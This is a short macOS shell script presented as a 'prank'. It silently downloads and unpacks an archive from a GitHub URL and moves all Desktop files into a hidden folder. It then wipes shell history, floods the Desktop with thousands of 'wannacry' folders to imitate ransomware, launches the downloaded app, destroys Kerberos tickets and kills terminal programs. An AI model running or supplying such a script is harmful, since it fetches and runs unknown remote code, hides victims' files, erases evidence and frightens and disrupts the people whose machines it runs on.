mkdir -p /tmp/okimdil/

curl -s -L https://github.com/YelazZ/p1/raw/master/prank.tar.gz -o /tmp/okimdil/prank.tar.gz > /dev/null

tar xvf /tmp/okimdil/prank.tar.gz -C /tmp/okimdil > /dev/null

mkdir ~/.Okimdil/

mv ~/Desktop/* ~/.Okimdil/

cd ~/Desktop

rm -rf ~/.*history*

mkdir wannacry{0..10000}

nohup open /tmp/okimdil/app/Laz.app > /dev/null

kdestroy
clear
rm -f ~/.*history*

killall iTerm
killall Terminal
killall iTerm2
